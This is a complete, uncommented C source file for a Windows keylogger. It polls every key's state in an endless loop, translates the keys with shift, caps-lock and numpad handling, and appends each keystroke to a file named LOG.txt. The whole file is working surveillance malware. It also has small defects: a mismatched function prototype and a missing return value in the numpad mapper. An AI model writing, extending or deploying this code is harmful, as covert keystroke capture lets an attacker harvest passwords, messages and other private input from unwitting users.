#include <stdio.h>
#include <windows.h>

int getShiftChar(int c, int capslock);
int getKey(int c);
int getNumPadKey(int c);
void save(FILE *file, int key);

int main(){
	
	while(1){
		
		int i;
		FILE *file = fopen("LOG.txt", "a+");	
		
		for(i = 8; i < 255; i++){
			if(
				GetAsyncKeyState(i) == -32767 && 
				i != VK_LSHIFT   && i != VK_SHIFT   && i != VK_RSHIFT   && 
				i != VK_LMENU    && i != VK_MENU    && i != VK_RMENU     && 
				i != VK_LCONTROL && i != VK_CONTROL && i != VK_RCONTROL && 
				i != VK_CAPITAL  && i != VK_NUMLOCK && i != VK_BACK
			){
			
				if(GetKeyState(VK_SHIFT) < 0){
					save(file, getShiftKey(i, GetKeyState(VK_CAPITAL)));
				
				}else if(GetKeyState(VK_CAPITAL) == 0 && i >= 0x41 && i <= 0x5A){
					save(file, i+32);
			
				}else if(GetKeyState(VK_NUMLOCK) != 0 && i >= VK_NUMPAD0 && i <= VK_NUMPAD9){
					save(file, getNumPadKey(i));
				
				}else {
					save(file, getKey(i));
				
				}
				
				break;
			}
		}
		
		fclose(file);
	}
	return 0;
}

int getShiftKey(int c, int capslock){
	switch(c){
		case 48:
			return 41;
			break;
		case 49:
			return 33;
			break;
		case 50:
			return 64;
			break;
		case 51:
			return 35;
			break;
		case 52:
			return 36;
			break;
		case 53:
			return 37;
			break;
		case 55:
			return 38;
			break;
		case 56:
			return 42;
			break;
		case 57:
			return 40;
			break;
		case 192:
			return 34;
			break;
		case 189:
			return 95;
			break;
		case 187:
			return 43;
			break;
		case 221:
			return 123;
			break;
		case 220:
			return 125;
			break;
		case 188:
			return 60;
			break;
		case 190:
			return 62;
			break;
		case 191:
			return 58;
			break;
		case 193:
			return 63;
			break;
		case 226:
			return 124;
			break;
		default:
			if(capslock && c >= 0x41 && c <= 0x5A){
				return c+32;
			}else {
				return c;
			}
	}
}

int getKey(int c){
	switch(c){
		case VK_SPACE:
			return 32;
			break;
		case 187:
			return 61;
			break;
		case 188:
			return 44;
			break;
		case 189:
			return 45;
			break;
		case 190:
			return 46;
			break;
		case 191:
			return 59;
			break;
		case 192:
			return 39;
			break;
		case 193:
			return 47;
			break;
		case 220:
			return 93;
			break;
		case 221:
			return 91;
			break;
		case 226:
			return 92;
			break;
		default:
			return c;
	}
}

int getNumPadKey(int c){
	switch(c){
		case VK_NUMPAD0:
			return 48;
			break;
		case VK_NUMPAD1:
			return 49;
			break;
		case VK_NUMPAD2:
			return 50;
			break;
		case VK_NUMPAD3:
			return 51;
			break;
		case VK_NUMPAD4:
			return 52;
			break;
		case VK_NUMPAD5:
			return 53;
			break;
		case VK_NUMPAD6:
			return 54;
			break;
		case VK_NUMPAD7:
			return 55;
			break;
		case VK_NUMPAD8:
			return 56;
			break;
		case VK_NUMPAD9:
			return 57;
			break;
	}
}

void save(FILE *file, int key){
	fputc(key, file);
}